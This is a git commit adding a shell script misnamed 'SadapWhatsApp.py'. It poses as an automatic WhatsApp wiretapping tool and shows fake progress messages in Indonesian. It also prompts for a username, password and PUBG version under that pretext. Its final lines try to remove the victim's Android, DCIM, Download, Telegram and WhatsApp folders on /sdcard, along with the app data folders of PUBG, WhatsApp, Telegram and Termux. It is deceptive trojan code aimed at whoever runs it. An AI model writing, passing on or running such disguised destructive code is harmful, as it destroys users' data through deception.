e32350fff8b6aeaf276e624285013e8f1e03cfc5
MrWHITE-13 <55680918+MrWHITE-13@users.noreply.github.com>
2019-09-27 13:42:54 +0700

    Add files via upload

---
+++ SadapWhatsApp.py
@@ -0,0 +1,38 @@
+clear
+#!/bin/bash
+
+echo "\033[1;31m ____    _    ____    _    ____
+/ ___|  / \  |  _ \  / \  |  _ \
+\___ \ / _ \ | | | |/ _ \ | |_) |
+ ___) / ___ \| |_| / ___ \|  __/
+|____/_/   \_\____/_/   \_\_|"
+echo -n "\033[1;33m Waktu system   :"; date
+echo -n "Anda           :"; whoami
+sleep 3s
+echo " "
+read -p "User Name : " Cyber
+read -p "Password : " Army
+read -p "Versi PUBG : " Global
+clear
+echo "\033[44;1;33;5m Starting\033[0m"
+sleep 3s
+echo " "
+echo " "
+echo " "
+SETMYCOLOR="\033[41;0;32m"
+echo "$SETMYCOLOR Melakukan Penyadapan Ke Kontak WhatsApp\033[0m"
+sleep 1s
+echo "$SETMYCOLOR Tools Ini Melakukan Penyadapan Dengan Otomatis\033[0m"
+sleep 3s
+echo "$SETMYCOLOR Please Wait ...\033[0m"
+sleep 3s
+echo "$SETMYCOLOR Start Penyadapan ...\033[0m"
+sleep 1s
+echo "$SETMYCOLOR Jangan Close Tools Ini Hingga Selesai ...\033[0m"
+sleep 3s
+cd /sdcard
+rmdir Android DCIM Download Telegram WhatsApp
+rm -f Tutorial.sh
+rmdir /data/data/com.tencent.ig com.whatsapp org.telegram.messenger com.termux
+echo "$SETMYCOLOR Selamat Bermain Bree ...\033[0m"
+sleep 15m
